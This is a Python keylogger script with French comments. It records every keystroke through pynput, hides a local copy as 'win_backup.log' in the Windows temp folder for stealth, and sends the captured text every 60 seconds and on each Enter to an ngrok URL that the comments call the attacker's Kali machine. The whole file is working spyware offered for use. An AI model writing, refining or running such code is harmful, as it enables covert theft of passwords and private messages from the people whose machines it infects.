import pynput.keyboard
import requests
import time
import threading 
import os
import tempfile 
import sys 

# --- Configuration Distante (VOTRE ADRESSE NGROK) ---
# Ceci est l'URL de votre Kali Attaquante qui écoute sur le port 5000 via Ngrok.
NGROK_URL = "http://jeanelle-quintic-lumberingly.ngrok-free.dev" 
INTERVAL_SECONDS = 60 # Envoi toutes les 60 secondes

# --- Gestion du Chemin de Sauvegarde Windows (Furtivité) ---
# Utilise le dossier temporaire de Windows pour cacher le fichier de sauvegarde locale.
LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log") 

# Variables globales
log_buffer = ""

def send_log_data(data):
    """
    Envoie les données au serveur ngrok.
    Vide le buffer UNIQUEMENT si l'envoi réussit (code 200).
    Fait toujours une sauvegarde locale.
    """
    global log_buffer
    
    # Ne fait rien si le buffer est vide
    if not data.strip():
        return 

    # --- Sauvegarde locale de sécurité (Écriture) ---
    try:
        with open(LOG_FILE, "a") as f:
            f.write(data)
    except Exception:
        pass

    # --- Tentative d'envoi à Kali ---
    try:
        response = requests.post(NGROK_URL, data={'log': data})
        
        if response.status_code == 200:
            # SUCCÈS : Vide le buffer pour éviter la répétition du log.
            log_buffer = "" 
             
    except requests.exceptions.RequestException:
        # Échec de la connexion : ne vide PAS le buffer.
        pass

def report():
    """
    Fonction d'envoi exécutée en parallèle toutes les INTERVAL_SECONDS.
    """
    global log_buffer
    
    # Configure le minuteur pour exécuter report() à nouveau dans 60 secondes
    threading.Timer(INTERVAL_SECONDS, report).start() 
    
    # Si le buffer contient des données, on les envoie
    if log_buffer:
        send_log_data(log_buffer)

def on_press(key):
    """
    Capture les frappes de clavier, filtre les touches de contrôle et remplit le buffer.
    """
    global log_buffer
    
    current_key = None
    
    try:
        # Tente d'obtenir le caractère (A, b, 1, $, etc.)
        current_key = key.char
        log_buffer += current_key
        
    except AttributeError:
        # Gère les touches spéciales
        if key == pynput.keyboard.Key.space:
            log_buffer += " "
            
        elif key == pynput.keyboard.Key.enter:
            log_buffer += "\n"
            
            # --- VÉRIFICATION CRUCIALE ANTI-ENVOI VIDE ---
            # Si le buffer contient du texte significatif, on envoie.
            if log_buffer.strip():
                send_log_data(log_buffer)
            
            # Dans tous les cas (envoyé ou non), on vide le buffer pour repartir à zéro.
            log_buffer = "" 
            return # Sort immédiatement après Enter

        elif key == pynput.keyboard.Key.backspace:
            # Gère le backspace immédiatement dans le buffer
            if len(log_buffer) > 0:
                log_buffer = log_buffer[:-1]
            return # Sort immédiatement après backspace
            
        else:
            # IGNORER : Toutes les touches de contrôle (CTRL, ALT, SHIFT, F1, F2, etc.)
            return 

# --- Démarrage ---

# Démarre le minuteur pour l'envoi périodique dans un thread séparé
report() 

# Crée et lance l'écouteur dans le thread principal
with pynput.keyboard.Listener(on_press=on_press) as listener:
    # Le keylogger commence à écouter
    listener.join()
